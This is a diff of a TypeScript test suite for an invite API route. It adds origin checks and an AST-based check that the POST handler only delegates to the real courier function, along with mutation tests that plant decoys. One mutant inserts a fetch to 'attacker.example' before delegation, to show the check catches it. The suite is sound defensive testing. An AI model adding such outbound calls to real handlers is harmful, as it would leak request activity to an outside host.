@@ -22,6 +22,7 @@ import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { fileURLToPath } from "node:url";
+import ts from "typescript";
 
 import { handleInviteRequest, type InviteCourierLogEntry } from "../lib/members/courier";
 import { InviteMailFailure } from "../lib/members/invite-mail";
@@ -170,6 +171,33 @@ describe("the invitation link is built from the origin the wall PROVED", () => {
     assert.equal(res.status, 200);
     const href = /href="([^"]+)"/.exec(obs.sends[0]!.html)?.[1];
     assert.equal(new URL(href as string).origin, "https://alias.clara.example");
+  });
+
+  test("N3: a configured URL carrying a path is not an origin and cannot license the courier", async () => {
+    const obs = observer();
+    const { deps: d, calls, callerReads } = deps(
+      obs,
+      { resolve: OK_RECEIPT },
+      { env: { ...FULL_ENV, CLARA_PUBLIC_ORIGINS: "https://app.clara.example/invite" } },
+    );
+    const request = new Request("https://internal.worker.local/api/invite", {
+      method: "POST",
+      headers: {
+        origin: "https://app.clara.example",
+        "sec-fetch-site": "same-origin",
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({ email: "new@example.test", role: "bookkeeper" }),
+    });
+
+    const res = await handleInviteRequest(request, d);
+    assert.equal(res.status, 403);
+    assert.equal((await json(res)).code, "cross_origin");
+    assert.equal(callerReads.length, 0, "the refusal happens before the authority preflight");
+    assert.equal(obs.mintChecks.length, 0, "no directory read");
+    assert.equal(calls.length, 0, "no door call");
+    assert.equal(obs.mints.length, 0, "no provider mint");
+    assert.equal(obs.sends.length, 0, "no send");
   });
 
   test("a request whose Origin matches nothing addressed is still refused, and mails nothing", async () => {
@@ -434,7 +462,7 @@ describe("the door and the firm read run on the CALLER'S OWN session", () => {
     const { deps: d, calls, firmReads } = deps(
       obs,
       { resolve: OK_RECEIPT },
-      { resolveSession: deadSession, env: {} },
+      { resolveSession: deadSession, env: { CLARA_ALLOW_INSECURE_LOOPBACK: "1" } },
     );
     const res = await handleInviteRequest(post({ email: "a@b.test", role: "admin" }), d);
 
@@ -473,19 +501,95 @@ describe("the door and the firm read run on the CALLER'S OWN session", () => {
  * `function handleInviteRequest()` decoy satisfies both halves while the shipped
  * POST calls the decoy.
  */
-function importedLocalName(code: string, exported: string): string | null {
-  for (const m of code.matchAll(/import\s+([\s\S]*?)from\s*["']([^"']+)["']/g)) {
-    const clause = m[1] as string;
-    if (/^\s*type\s/.test(clause)) continue; // erased at compile time; not the real function
-    const braces = /\{([^}]*)\}/.exec(clause);
-    if (!braces) continue;
-    for (const spec of (braces[1] as string).split(",")) {
-      const parsed = /^\s*([A-Za-z_$][\w$]*)(?:\s+as\s+([A-Za-z_$][\w$]*))?\s*$/.exec(spec);
-      if (!parsed) continue;
-      if (parsed[1] === exported) return (parsed[2] ?? parsed[1]) as string;
+const COURIER_MODULE = "@/lib/members/courier";
+
+function sourceFile(code: string): ts.SourceFile {
+  return ts.createSourceFile("route.ts", code, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
+}
+
+function importedLocalName(code: string, exported: string, moduleSpecifier = COURIER_MODULE): string | null {
+  for (const statement of sourceFile(code).statements) {
+    if (!ts.isImportDeclaration(statement) || !ts.isStringLiteral(statement.moduleSpecifier)) continue;
+    if (statement.moduleSpecifier.text !== moduleSpecifier || statement.importClause?.isTypeOnly) continue;
+    const bindings = statement.importClause?.namedBindings;
+    if (!bindings || !ts.isNamedImports(bindings)) continue;
+    for (const specifier of bindings.elements) {
+      if (specifier.isTypeOnly) continue;
+      const imported = specifier.propertyName?.text ?? specifier.name.text;
+      if (imported === exported) return specifier.name.text;
     }
   }
   return null;
+}
+
+function hasExportModifier(node: ts.Node): boolean {
+  return ts.canHaveModifiers(node) && ts.getModifiers(node)?.some((m) => m.kind === ts.SyntaxKind.ExportKeyword) === true;
+}
+
+function bindingNames(name: ts.BindingName): string[] {
+  if (ts.isIdentifier(name)) return [name.text];
+  return name.elements.flatMap((element) => ts.isOmittedExpression(element) ? [] : bindingNames(element.name));
+}
+
+/** Named structural reasons why the route is not the one-call courier wrapper. */
+function routeDelegationIssues(code: string): string[] {
+  const file = sourceFile(code);
+  const issues: string[] = [];
+  const local = importedLocalName(code, "handleInviteRequest");
+  if (local === null) issues.push("missing_exact_courier_import");
+
+  const post = file.statements.find(
+    (statement): statement is ts.FunctionDeclaration =>
+      ts.isFunctionDeclaration(statement) && statement.name?.text === "POST" && hasExportModifier(statement),
+  );
+  if (!post?.body) return [...issues, "missing_direct_post_body"];
+
+  const parameter = post.parameters[0];
+  if (post.parameters.length !== 1 || parameter === undefined || !ts.isIdentifier(parameter.name) || parameter.name.text !== "request") {
+    issues.push("post_does_not_take_request");
+  }
+
+  if (local !== null) {
+    let shadowsImport = false;
+    const visitDeclaration = (node: ts.Node): void => {
+      if (
+        (ts.isVariableDeclaration(node) || ts.isParameter(node)) && bindingNames(node.name).includes(local)
+      ) {
+        shadowsImport = true;
+      } else if (
+        (ts.isFunctionDeclaration(node) || ts.isClassDeclaration(node)) && node.name?.text === local
+      ) {
+        shadowsImport = true;
+      }
+      ts.forEachChild(node, visitDeclaration);
+    };
+    ts.forEachChild(post.body, visitDeclaration);
+    if (shadowsImport) issues.push("post_shadows_courier_import");
+  }
+
+  const calls: ts.CallExpression[] = [];
+  const visitCall = (node: ts.Node): void => {
+    if (ts.isCallExpression(node)) calls.push(node);
+    ts.forEachChild(node, visitCall);
+  };
+  ts.forEachChild(post.body, visitCall);
+
+  const onlyStatement = post.body.statements.length === 1 ? post.body.statements[0] : undefined;
+  const expression = onlyStatement && ts.isReturnStatement(onlyStatement) ? onlyStatement.expression : undefined;
+  let exactDelegation = false;
+  if (local !== null && expression !== undefined && ts.isCallExpression(expression)) {
+    const argument = expression.arguments[0];
+    exactDelegation =
+      ts.isIdentifier(expression.expression) &&
+      expression.expression.text === local &&
+      expression.arguments.length === 1 &&
+      argument !== undefined &&
+      ts.isIdentifier(argument) &&
+      argument.text === "request";
+  }
+  if (!exactDelegation) issues.push("post_is_not_one_exact_delegation");
+  if (calls.length !== 1 || !exactDelegation) issues.push("post_has_additional_call_side_effect");
+  return issues;
 }
 
 describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and nothing else", () => {
@@ -497,7 +601,7 @@ describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and no
   // is length-preserving, so offsets and reachability are unaffected.
   const executable = readCode(join(WEB_ROOT, ROUTE), { blankStrings: true });
 
-  test("it VALUE-imports handleInviteRequest — a type-only edge would not be the real function", () => {
+  test("it VALUE-imports handleInviteRequest from the EXACT courier module", () => {
     assert.ok(importedLocalName(code, "handleInviteRequest") !== null, `${ROUTE} does not value-import handleInviteRequest`);
   });
 
@@ -524,6 +628,33 @@ describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and no
 
   test("POST is the ONLY verb exported — a second handler is a second, unguarded path", () => {
     assert.deepEqual(exportedHttpMethods(code), ["POST"]);
+  });
+
+  test("POST is structurally one exact delegation, with no shadow and no additional call side effect", () => {
+    assert.deepEqual(routeDelegationIssues(readFileSync(join(WEB_ROOT, ROUTE), "utf8")), []);
+  });
+
+  test("RED-BEFORE: an import from the WRONG MODULE fails identity even when every spelling matches", () => {
+    const mutant = readFileSync(join(WEB_ROOT, ROUTE), "utf8").replace(COURIER_MODULE, "@/lib/members/decoy-courier");
+    assert.equal(importedLocalName(mutant, "handleInviteRequest"), null);
+    assert.ok(routeDelegationIssues(mutant).includes("missing_exact_courier_import"));
+  });
+
+  test("RED-BEFORE: a POST-local shadow fails before its matching call can impersonate the import", () => {
+    const mutant =
+      'import { handleInviteRequest } from "@/lib/members/courier";\n' +
+      "export async function POST(request: Request): Promise<Response> {\n" +
+      "  const handleInviteRequest = async (_request: Request) => new Response(null);\n" +
+      "  return handleInviteRequest(request);\n}\n";
+    assert.ok(routeDelegationIssues(mutant).includes("post_shadows_courier_import"));
+  });
+
+  test("RED-BEFORE: an extra fetch before delegation fails the no-additional-side-effects pin", () => {
+    const mutant = readFileSync(join(WEB_ROOT, ROUTE), "utf8").replace(
+      "  return handleInviteRequest(request);",
+      '  await fetch("https://attacker.example/observe");\n  return handleInviteRequest(request);',
+    );
+    assert.ok(routeDelegationIssues(mutant).includes("post_has_additional_call_side_effect"));
   });
 
   test("RED-BEFORE: a reachable STRING decoy no longer satisfies the delegation pin", () => {
@@ -584,13 +715,14 @@ describe("app/api/invite/route.ts is a wrapper around handleInviteRequest and no
     );
   });
 
-  test("RED-BEFORE: all three EXPORT SHAPES of a second verb are seen (P4-2 round 3's repair, in use here)", () => {
+  test("RED-BEFORE: every EXPORT SHAPE of a second verb is seen (P4-2's oracle, extended here)", () => {
     // `export { x as GET }`, `export let GET` and `export var GET` were invisible
     // to the census before P4-2's round-3 fix; this branch now sits on it, so the
     // repair is exercised from this route's own pin rather than trusted.
     const raw = readFileSync(join(WEB_ROOT, ROUTE), "utf8");
     const shapes: Record<string, string> = {
       "aliased export clause": "\nasync function rawGet(): Promise<Response> { return new Response(null); }\nexport { rawGet as GET };\n",
+      "quoted aliased export clause": '\nasync function rawGet(): Promise<Response> { return new Response(null); }\nexport { rawGet as "GET" };\n',
       "export let": "\nexport let GET = async (): Promise<Response> => new Response(null);\n",
       "export var": "\nexport var GET = async (): Promise<Response> => new Response(null);\n",
       "plain function": "\nexport async function GET(): Promise<Response> { return new Response(null); }\n",
